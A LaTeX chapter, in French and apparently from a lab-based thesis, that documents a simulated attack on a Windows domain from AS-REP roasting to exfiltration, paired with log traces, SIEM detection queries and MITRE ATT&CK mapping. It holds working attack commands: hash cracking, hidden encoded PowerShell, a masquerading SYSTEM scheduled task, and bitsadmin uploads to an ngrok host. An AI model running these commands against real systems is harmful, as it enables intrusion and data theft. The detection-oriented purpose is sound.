@@ -1,0 +1,347 @@
+\chapter{Simulation complète de l'attaque}
+
+\section{Introduction}
+
+Ce chapitre présente la simulation détaillée de l'attaque menée contre le serveur Windows dans un environnement contrôlé. L'objectif est de reproduire une chaîne d'attaque réaliste utilisant des techniques « Living off the Land » (LotL), c'est-à-dire en s'appuyant principalement sur des outils légitimes du système Windows.
+
+La chaîne d'attaque suit le modèle Cyber Kill Chain et couvre les phases suivantes :
+\begin{enumerate}
+\item \textbf{Initial Access} : AS-REP Roasting
+\item \textbf{Credential Access} : Craquage hors-ligne des hash
+\item \textbf{Execution} : Commandes PowerShell encodées
+\item \textbf{Discovery} : Reconnaissance du système
+\item \textbf{Persistence} : Création de tâches planifiées
+\item \textbf{Exfiltration} : Transfert de données via BITS
+\end{enumerate}
+
+\section{Phase 1 : Initial Access - AS-REP Roasting}
+
+\subsection{Principe de l'attaque}
+
+L'AS-REP Roasting est une technique d'attaque Kerberos qui exploite les comptes utilisateurs pour lesquels la pré-authentification Kerberos n'est pas requise. Lorsqu'un compte a l'attribut « Do not require Kerberos preauthentication » activé, un attaquant peut demander un ticket TGT (Ticket Granting Ticket) sans fournir de preuve d'identité.
+
+Le ticket reçu contient une partie chiffrée avec le mot de passe de l'utilisateur, qui peut être craqué hors-ligne.
+
+\subsection{Exécution de l'attaque}
+
+\subsubsection{Préparation de la liste d'utilisateurs}
+
+Sur la machine attaquante (Kali Linux), nous préparons une liste de noms d'utilisateurs potentiels :
+
+\begin{lstlisting}[language=bash, caption={Liste d'utilisateurs cibles}]
+# Contenu du fichier username.txt
+Administrator
+Admin
+Guest
+SQLAdmin
+ServiceAccount
+jaber
+\end{lstlisting}
+
+\subsubsection{Exécution d'AS-REP Roasting avec Impacket}
+
+Nous utilisons l'outil \texttt{impacket-GetNPUsers} pour tenter de récupérer les hash AS-REP :
+
+\begin{lstlisting}[language=bash, caption={Commande AS-REP Roasting}]
+impacket-GetNPUsers ooc.local/ -usersfile username.txt \
+  -format hashcat -dc-ip 192.168.134.85
+\end{lstlisting}
+
+\textbf{Paramètres :}
+\begin{itemize}
+\item \texttt{ooc.local/} : Domaine cible
+\item \texttt{-usersfile username.txt} : Fichier contenant la liste des utilisateurs
+\item \texttt{-format hashcat} : Format de sortie compatible avec Hashcat/John
+\item \texttt{-dc-ip 192.168.134.85} : Adresse IP du contrôleur de domaine
+\end{itemize}
+
+\textbf{Résultat :} L'outil identifie que l'utilisateur \texttt{jaber} a la pré-authentification désactivée et retourne son hash AS-REP.
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.9\textwidth]{context/AS-REP Roasting Attack.png}
+\caption{Capture d'écran de l'attaque AS-REP Roasting avec Impacket}
+\label{fig:asrep-roasting}
+\end{figure}
+
+\subsection{Traces laissées dans les logs}
+
+Cette attaque génère les événements suivants dans les logs Windows :
+\begin{itemize}
+\item \textbf{Event ID 4768} : Demande de ticket TGT avec \texttt{PreAuthType = 0}
+\item \textbf{Event ID 4776} : Tentatives d'authentification multiples
+\end{itemize}
+
+\textbf{Requête SIEM pour détecter l'AS-REP Roasting :}
+\begin{lstlisting}[language=SQL, caption={Détection AS-REP Roasting dans Elastic}]
+event.code: 4768 AND winlog.event_data.PreAuthType: 0
+\end{lstlisting}
+
+\section{Phase 2 : Credential Access - Craquage hors-ligne}
+
+\subsection{Extraction du hash}
+
+Le hash AS-REP récupéré est sauvegardé dans un fichier :
+
+\begin{lstlisting}[language=bash, caption={Fichier hash.txt}]
+$krb5asrep$23$jaber@OOC.LOCAL:hash_data...
+\end{lstlisting}
+
+\subsection{Craquage avec John The Ripper}
+
+Nous utilisons John The Ripper pour craquer le hash en mode dictionnaire :
+
+\begin{lstlisting}[language=bash, caption={Craquage du hash avec John}]
+john --wordlist=passwords.txt --format=krb5asrep hash.txt
+\end{lstlisting}
+
+\textbf{Résultat obtenu :}
+\begin{itemize}
+\item \textbf{Username :} jaber
+\item \textbf{Password :} P@ssw0rd123
+\end{itemize}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.9\textwidth]{context/Offline Password Cracking with Jhon The Reaper.png}
+\caption{Craquage hors-ligne du mot de passe avec John The Ripper}
+\label{fig:password-cracking}
+\end{figure}
+
+Le craquage hors-ligne présente l'avantage pour l'attaquant de ne laisser aucune trace supplémentaire sur le système cible, car il s'effectue entièrement sur la machine de l'attaquant.
+
+\section{Phase 3 : Execution - Accès RDP et PowerShell encodé}
+
+\subsection{Connexion RDP}
+
+Avec les credentials compromis, l'attaquant se connecte au serveur via RDP :
+
+\begin{lstlisting}[language=bash, caption={Connexion RDP depuis Kali Linux}]
+# Sur Kali Linux, utilisation de remmina ou xfreerdp
+remmina
+# Ou
+xfreerdp /u:jaber /p:P@ssw0rd123 /v:192.168.134.85
+\end{lstlisting}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=0.9\textwidth]{context/Access to the machine victim via RDP.png}
+\caption{Accès à la machine victime via RDP}
+\label{fig:rdp-access}
+\end{figure}
+
+\textbf{Traces dans les logs :}
+\begin{itemize}
+\item \textbf{Event ID 4624} : Successful logon (Type 10 = Remote Interactive)
+\item \textbf{Event ID 4648} : Logon avec credentials explicites
+\item Sysmon Event ID 3 : Connexion réseau établie
+\end{itemize}
+
+\subsection{Exécution de PowerShell encodé - Vérification des privilèges}
+
+Une fois connecté, l'attaquant exécute une commande PowerShell encodée pour vérifier ses privilèges :
+
+\subsubsection{Préparation du script sur Kali}
+
+\begin{lstlisting}[language=bash, caption={Encodage du script PowerShell sur Kali}]
+echo -n "Write-Host '--- Privilege Status ---'; \
+[Security.Principal.WindowsPrincipal] \
+[Security.Principal.WindowsIdentity]::GetCurrent() \
+.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator); \
+Write-Host '--- Sensitive Files ---'; \
+Get-ChildItem -Path C:\ -Include *.kdbx, *.bak \
+-Recurse -ErrorAction SilentlyContinue | \
+Select-Object FullName" | iconv -t UTF-16LE | base64 -w 0
+\end{lstlisting}
+
+Cette commande :
+\begin{enumerate}
+\item Vérifie si l'utilisateur a des privilèges administrateur
+\item Recherche des fichiers sensibles (KeePass \texttt{.kdbx}, backups \texttt{.bak})
+\item Encode le tout en Base64 UTF-16LE (format attendu par PowerShell)
+\end{enumerate}
+
+\subsubsection{Exécution sur Windows Server}
+
+\begin{lstlisting}[language=powershell, caption={Exécution PowerShell encodée}]
+powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Enc <base64_encoded_command> >> pcheck.txt
+\end{lstlisting}
+
+\textbf{Paramètres :}
+\begin{itemize}
+\item \texttt{-ExecutionPolicy Bypass} : Contourne les restrictions d'exécution
+\item \texttt{-WindowStyle Hidden} : Fenêtre masquée
+\item \texttt{-Enc} : Commande encodée en Base64
+\item \texttt{>> pcheck.txt} : Redirection de la sortie
+\end{itemize}
+
+\textbf{Traces dans les logs :}
+\begin{itemize}
+\item \textbf{Event ID 4104} : PowerShell Script Block Logging (capture le script décodé)
+\item Sysmon Event ID 1 : Création du processus \texttt{powershell.exe}
+\end{itemize}
+
+\textbf{Requête SIEM pour détecter PowerShell encodé :}
+\begin{lstlisting}[language=SQL, caption={Détection PowerShell encodé}]
+event.code: 4104 AND 
+(message: "*-Enc*" OR message: "*-EncodedCommand*" OR 
+ message: "*JAB*" OR message: "*SUY*")
+\end{lstlisting}
+
+\section{Phase 4 : Discovery - Reconnaissance du système}
+
+\subsection{Recherche de fichiers sensibles}
+
+L'attaquant exécute une seconde commande PowerShell encodée pour rechercher des fichiers spécifiques :
+
+\begin{lstlisting}[language=powershell, caption={Recherche de fichiers sensibles}]
+powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Enc <encoded_discovery_script> >> discovery.txt
+\end{lstlisting}
+
+Le script recherche :
+\begin{itemize}
+\item Fichiers \texttt{.kdbx} (bases de données KeePass)
+\item Fichiers \texttt{.bak} (backups)
+\item Fichiers \texttt{.vhdx} (disques virtuels)
+\end{itemize}
+
+\subsection{Énumération Active Directory}
+
+L'attaquant peut également énumérer les informations du domaine :
+
+\begin{lstlisting}[language=powershell, caption={Énumération Active Directory}]
+# Lister les utilisateurs du domaine
+Get-ADUser -Filter *
+
+# Lister les groupes
+Get-ADGroup -Filter *
+
+# Identifier les administrateurs
+Get-ADGroupMember "Domain Admins"
+\end{lstlisting}
+
+\section{Phase 5 : Persistence - Création de tâche planifiée}
+
+\subsection{Objectif de la persistance}
+
+Pour maintenir l'accès et automatiser l'exfiltration, l'attaquant crée une tâche planifiée malveillante qui se fait passer pour une tâche légitime.
+
+\subsection{Création du script d'exfiltration}
+
+\begin{lstlisting}[language=powershell, caption={Script d'exfiltration exfil.ps1}]
+Set-Content -Path "C:\Users\Public\exfil.ps1" -Value `
+'bitsadmin /transfer "LogUpload" /upload /priority high `
+https://yoko-kilometrical-federico.ngrok-free.dev/update.zip `
+C:\Users\Public\update.zip'
+\end{lstlisting}
+
+\subsection{Compression des données cibles}
+
+\begin{lstlisting}[language=powershell, caption={Compression des fichiers à exfiltrer}]
+Compress-Archive -Path "E:\WindowsImageBackup\WINOTH6RGRFFNA\Logs\Backup_Error-30-12-2025*" `
+-DestinationPath "C:\Users\Public\update.zip" -Force
+\end{lstlisting}
+
+\subsection{Création de la tâche planifiée}
+
+L'attaquant utilise \texttt{schtasks.exe} pour créer une tâche qui semble légitime :
+
+\begin{lstlisting}[language=bash, caption={Création de tâche planifiée malveillante}]
+schtasks /create /tn "Microsoft\Windows\CertificateServices\CertValidation" `
+/tr "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Users\Public\exfil.ps1" `
+/sc minute /mo 5 /ru "SYSTEM" /f
+\end{lstlisting}
+
+\textbf{Paramètres :}
+\begin{itemize}
+\item \texttt{/tn} : Nom de la tâche (masquerade dans un dossier Microsoft légitime)
+\item \texttt{/tr} : Commande à exécuter
+\item \texttt{/sc minute /mo 5} : Exécution toutes les 5 minutes
+\item \texttt{/ru "SYSTEM"} : Exécution avec les privilèges SYSTEM
+\item \texttt{/f} : Force la création (écrase si existe)
+\end{itemize}
+
+\textbf{Traces dans les logs :}
+\begin{itemize}
+\item \textbf{Event ID 4698} : Création d'une tâche planifiée
+\item Sysmon Event ID 1 : Création de processus \texttt{schtasks.exe}
+\end{itemize}
+
+\textbf{Requête SIEM pour détecter les tâches planifiées suspectes :}
+\begin{lstlisting}[language=SQL, caption={Détection création de tâches planifiées}]
+event.code: 4698 AND 
+(process.command_line: "*powershell*" OR 
+ process.command_line: "*-Enc*")
+\end{lstlisting}
+
+\section{Phase 6 : Exfiltration - Transfert via BITS}
+
+\subsection{Principe de l'exfiltration via BITS}
+
+BITS (Background Intelligent Transfer Service) est un composant légitime de Windows utilisé pour les transferts de fichiers en arrière-plan. Les attaquants l'utilisent car :
+\begin{itemize}
+\item Il est signé par Microsoft (confiance)
+\item Il peut opérer en arrière-plan
+\item Il génère moins d'alertes que les outils réseau classiques
+\item Il persiste aux redémarrages
+\end{itemize}
+
+\subsection{Exécution de l'exfiltration}
+
+La tâche planifiée exécute périodiquement le script d'exfiltration :
+
+\begin{lstlisting}[language=bash, caption={Commande BITS pour exfiltration}]
+bitsadmin /transfer "LogUpload" /upload /priority high `
+https://attacker-server.ngrok-free.dev/update.zip `
+C:\Users\Public\update.zip
+\end{lstlisting}
+
+\subsection{Traces de l'exfiltration}
+
+\textbf{Logs Windows :}
+\begin{itemize}
+\item Sysmon Event ID 1 : Processus \texttt{bitsadmin.exe}
+\item Sysmon Event ID 3 : Connexion réseau vers IP externe
+\item Event ID 59 : BITS job started
+\end{itemize}
+
+\textbf{Requête SIEM pour détecter l'exfiltration BITS :}
+\begin{lstlisting}[language=SQL, caption={Détection exfiltration via BITS}]
+process.name: "bitsadmin.exe" AND 
+(process.command_line: "*upload*" OR 
+ destination.ip: (NOT 192.168.0.0/16 AND NOT 10.0.0.0/8))
+\end{lstlisting}
+
+\section{Timeline complète de l'attaque}
+
+\begin{table}[H]
+\centering
+\small
+\begin{tabular}{@{}llp{6cm}l@{}}
+\toprule
+\textbf{T+} & \textbf{Phase} & \textbf{Action} & \textbf{Technique} \\ \midrule
+00:00 & Initial Access & AS-REP Roasting & T1558.004 \\
+00:05 & Credential Access & Craquage hash offline & T1110 \\
+00:15 & Execution & Connexion RDP & T1021.001 \\
+00:20 & Execution & PowerShell encodé & T1059.001 \\
+00:25 & Discovery & Énumération fichiers & T1083 \\
+00:30 & Persistence & Création tâche planifiée & T1053.005 \\
+00:35 & Collection & Compression données & T1560 \\
+00:40 & Exfiltration & Transfert BITS & T1197 \\ \bottomrule
+\end{tabular}
+\caption{Timeline de l'attaque avec mapping MITRE ATT\&CK}
+\label{tab:attack-timeline}
+\end{table}
+
+\section{Conclusion}
+
+Ce chapitre a détaillé la simulation complète d'une attaque sophistiquée utilisant des techniques « Living off the Land ». Chaque phase de l'attaque a été documentée avec :
+\begin{itemize}
+\item Les commandes exactes exécutées
+\item Les figures illustrant les étapes clés
+\item Les traces laissées dans les logs Windows
+\item Les requêtes SIEM pour détecter chaque technique
+\item Le mapping MITRE ATT\&CK correspondant
+\end{itemize}
+
+Le chapitre suivant présentera l'investigation complète utilisant la méthode ACH (Analysis of Competing Hypotheses) pour analyser ces événements, formuler des hypothèses, et déterminer la nature réelle de l'activité observée.
